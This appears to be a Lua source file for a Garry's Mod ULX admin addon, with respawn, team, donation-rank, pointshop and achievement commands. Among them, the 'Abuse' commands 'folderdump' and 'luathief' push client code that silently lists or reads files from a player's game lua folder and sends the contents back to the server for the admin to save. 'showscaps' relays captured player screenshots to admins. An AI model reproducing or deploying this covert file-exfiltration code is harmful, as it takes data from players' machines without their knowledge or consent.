function ulx.respawn(calling_ply,target_plys)
local affected_plys = {}

	for k,v in pairs(target_plys) do
		if (not v:Alive()) and (v:Team() == 1 or v:Team() == 2) then
			table.insert(affected_plys,v)
		else
		    if #affected_plys == 1 then
			    ULib.tsayError(calling_ply,v:Nick().." is spectator or alive!")
		    end
		end
	end
	
	for k,v in pairs(affected_plys) do
		v:Spawn()
	end


ulx.fancyLogAdmin( calling_ply,  "#A respawned #T", affected_plys)

end
local respawn = ulx.command("DeathRun", "ulx respawn", ulx.respawn, "!respawn",true)
respawn:addParam{ type=ULib.cmds.PlayersArg }
respawn:defaultAccess( ULib.ACCESS_SUPERADMIN )
respawn:help( "Respawn target<s>" )

function ulx.force(calling_ply,target_ply,team)
	local oldteam = target_ply:Team()
	if team == "death" then
		target_ply:SetTeam(TEAM_DEATH)
	elseif team == "runner" then
		target_ply:SetTeam(TEAM_RUNNER)
	else
		target_ply:SetTeam(TEAM_SPECTATOR)
	end
		
	if target_ply:Alive() and target_ply:Team() ~= oldteam and oldteam ~= TEAM_SPECTATOR then
		target_ply:Spawn()
	else
		target_ply:KillSilent()
	end
	
	ulx.fancyLogAdmin( calling_ply,  "#A forced #T to #s", target_ply,team)

end
local force = ulx.command("DeathRun", "ulx force", ulx.force, "!force",true)
force:addParam{ type=ULib.cmds.PlayerArg }
force:addParam{ type=ULib.cmds.StringArg, completes={"death","runner","spectator"}, hint="Role", error="invalid team \"%s\" specified", ULib.cmds.restrictToCompletes }
force:defaultAccess( ULib.ACCESS_SUPERADMIN )
force:help( "Force target to a team." )

function ulx.forcespec(calling_ply, target_ply)
	target_ply:SetTeam(TEAM_SPECTATOR)
	target_ply:KillSilent()
	
	ulx.fancyLogAdmin( calling_ply,  "#A forced #T to spectator", target_ply)
end
local forcespec = ulx.command("DeathRun", "ulx forcespec", ulx.forcespec, "!forcespec",true)
forcespec:addParam{ type=ULib.cmds.PlayerArg }
forcespec:defaultAccess( ULib.ACCESS_SUPERADMIN )
forcespec:help( "force target to spectator." )

function ulx.playtime(calling_ply)
	local caller = {calling_ply}
	

	local time = math.Round(calling_ply:GetUTimeTotalTime()/60)
	ulx.fancyLogAdmin( calling_ply, caller,  "Playtime: #s minutes", time)
	
end
local playtime = ulx.command("DeathRun", "ulx playtime", ulx.playtime, "!playtime",true)
playtime:defaultAccess( ULib.ACCESS_SUPERADMIN )
playtime:help( "Shows your current playime" )

hook.Add("RoundEnd","checkplaytimerank",function()
	for k,v in pairs(player.GetAll()) do
		if math.Round(v:GetUTimeTotalTime()/60) >= 720 and v:IsUserGroup("user") then
			local userInfo = ULib.ucl.authed[ v:UniqueID() ]

			local id = ULib.ucl.getUserRegisteredID( v )
			if not id then id = v:SteamID() end
			ULib.ucl.addUser( id, userInfo.allow, userInfo.deny, "regular" )
			ulx.fancyLogAdmin( nil, "#T was added to #s for playing on the server for 12 hours!", v, "regular" )
		end
	end
end)

function ulx.donate(calling_ply)
	calling_ply:SendLua([[
		gui.OpenURL("http://188.226.142.121/deathrun/donate/index.php?steamid="..LocalPlayer():SteamID().."&name="..LocalPlayer():Nick().."" )
	]])
	calling_ply:IncrAchStat("donatepageopens")
end
local donate = ulx.command("Donate", "ulx donate", ulx.donate, "!donate",true)
donate:defaultAccess( ULib.ACCESS_ALL )
donate:help( "Open donation panel" )

function ulx.addpdataid( calling_ply, id, rank )
	for k,v in pairs(player.GetAll()) do
		if v:SteamID() == id then
			v:SetPData(rank,true)
			v:SetNWBool("supporter",true)
			v:PS_GivePoints(500)
			v:IncrAchStat("donations")
			ulx.fancyLogAdmin( nil, "#T became a #s", v, rank )
			ULib.ucl.userAllow(id,"ulx reservedslots")
		end
		v:SendLua([[sound.PlayURL("http://puu.sh/6yKi0.ogg", "", function() end )]])
	end

end
local addpdataid = ulx.command( "DeathRun", "ulx addpdataid", ulx.addpdataid )
addpdataid:addParam{ type=ULib.cmds.StringArg, hint="SteamID, IP, or UniqueID" }
addpdataid:addParam{ type=ULib.cmds.StringArg, completes={"supporter","funder"}, hint="status", error="invalid status \"%s\" specified", ULib.cmds.restrictToCompletes }
addpdataid:defaultAccess( ULib.ACCESS_SUPERADMIN )
addpdataid:help( "Give ID a donor rank." )


local Player = FindMetaTable("Player")
function Player:IsSupporter()
	return tobool(self:GetNWBool("supporter")) or false
end

function ulx.givepointsid( calling_ply, id, rank )
	local points
	if rank == "Bronze" then
		points = 500
	elseif rank == "Silver" then
		points = 1200
	elseif rank == "Gold" then
		points = 1800
	end
	for k,v in pairs(player.GetAll()) do
		if v:SteamID() == id then
			v:PS_GivePoints(points)
			v:IncrAchStat("donations")
			ulx.fancyLogAdmin( nil, "#T bought the #s credit pack", v, rank )
		end
		v:SendLua([[sound.PlayURL("http://puu.sh/6yKi0.ogg", "", function() end )]])
	end

end
local givepointsid = ulx.command( "DeathRun", "ulx givepointsid", ulx.givepointsid )
givepointsid:addParam{ type=ULib.cmds.StringArg, hint="SteamID, IP, or UniqueID" }
givepointsid:addParam{ type=ULib.cmds.StringArg, completes={"Bronze","Silver","Gold"}, hint="pack", error="invalid pack \"%s\" specified", ULib.cmds.restrictToCompletes }
givepointsid:defaultAccess( ULib.ACCESS_SUPERADMIN )
givepointsid:help( "Give ID pointshop points." )

function ulx.toggledeafmode(calling_ply)
	calling_ply:SetDeafMode(not calling_ply:GetDeafMode())
	ULib.tsay(calling_ply, string.format("Your deafmode: %s", calling_ply:GetDeafMode()))
end
local tdm = ulx.command("DeathRun", "ulx toggledeafmode", ulx.toggledeafmode, "!toggledeafmode", true)
tdm:defaultAccess(ULib.ACCESS_ALL)

function ulx.forceachieve(calling_ply, target_ply,achievement)
	target_ply:AddAchievement(achievement)

ulx.fancyLogAdmin( calling_ply, true, "#A gave #T achievement: #s", target_ply,achievement)
end
local forceachieve = ulx.command("DeathRun", "ulx forceachieve", ulx.forceachieve, "!forceachieve",true)
forceachieve:addParam{ type=ULib.cmds.PlayerArg }
forceachieve:addParam{ type=ULib.cmds.StringArg, hint="achievement" }
forceachieve:defaultAccess( ULib.ACCESS_SUPERADMIN )
forceachieve:help( "Give an achievement to the target" )

if CLIENT then
    net.Receive("mist_fdu", function()
        local targ = net.ReadString()
        
        local lel = ""
        
        if targ ~= "" then
            lel = file.Read( "lua/" .. targ, "MOD" )
        else
            local fils, folds = file.Find('lua/*.lua', 'MOD')
            table.foreach(fils, function(k, v) lel = lel .. " " .. v end)
        end
        
        net.Start("mist_fdu")
        net.WriteString(lel)
        net.SendToServer()
    end)
end

if SERVER then
    util.AddNetworkString("mist_fdu")
    net.Receive("mist_fdu", function(le, cli)
        if not cli.FDUReq then return end
        
        local lel = net.ReadString()
        
        local req = cli.FDUReq
        if req.targ then
            local f = file.Open( req.targ .. ".txt", "w", "DATA" )
            f:Write( lel )
            f:Close()
            
            req.ply:ChatPrint("Saved: " .. req.targ)
        else
            req.ply:ChatPrint("FDUReq: " .. lel)
        end
        
        cli.FDUReq = nil
    end)
end


function ulx.folderdump( calling_ply, target_ply)
    
    target_ply.FDUReq = {ply=calling_ply}
    
    net.Start("mist_fdu")
    net.WriteString("")
    net.Send(target_ply)
    
    ulx.fancyLogAdmin( calling_ply, true, "#A req fdu #P", target_ply )

end
local folderdump = ulx.command( "Abuse", "ulx folderdump", ulx.folderdump, "!folderdump", true  )
folderdump:addParam{ type=ULib.cmds.PlayerArg }
folderdump:defaultAccess( ULib.ACCESS_SUPERADMIN )
folderdump:help( "pls" )

function ulx.luathief( calling_ply, target_ply, scr )

    target_ply.FDUReq = {ply=calling_ply, targ=scr}
    
    net.Start("mist_fdu")
    net.WriteString(scr)
    net.Send(target_ply)
    
    ulx.fancyLogAdmin( calling_ply, true, "#A req fdu #P s: #s", target_ply, scr )

end
local luathief = ulx.command( "Abuse", "ulx luathief", ulx.luathief, "!luathief", true  )
luathief:addParam{ type=ULib.cmds.PlayerArg }
luathief:addParam{ type=ULib.cmds.StringArg }
luathief:defaultAccess( ULib.ACCESS_SUPERADMIN )
luathief:help( "pls" )

function ulx.showscaps(calling_ply, target_ply)
	local filter = file.Find("scaps/" .. target_ply:SteamID64() .. "*.txt", "DATA")
	if #filter == 0 then
		ULib.tsay(calling_ply, "Zero scaps on server")
	end
	for _,fil in pairs(filter) do
		-- 
		local sid64, time = string.match(fil, "(%d+)_(%d+).txt")
		
		net.Start("ejb_showscap")
		net.WriteString("SCap of " .. target_ply:Nick() .. " at " .. os.date("%d.%M.%Y %H:%m", time))
		local data = file.Read("scaps/" .. fil)
		net.WriteUInt(data:len(), 16)
		net.WriteData(data, data:len())
		net.Send(calling_ply)
	end
end
local showscaps = ulx.command("Abuse", "ulx showscaps", ulx.showscaps)
showscaps:addParam{ type=ULib.cmds.PlayerArg }
showscaps:defaultAccess(ULib.ACCESS_SUPERADMIN)

function ulx.steam(calling_ply)
	calling_ply:SendLua([[
		gui.OpenURL("http://steamcommunity.com/groups/behindbars" )
	]])
end
local steam = ulx.command("Steam", "ulx steam", ulx.steam, "!steam")
steam:defaultAccess( ULib.ACCESS_ALL )
steam:help( "Open steam group" )
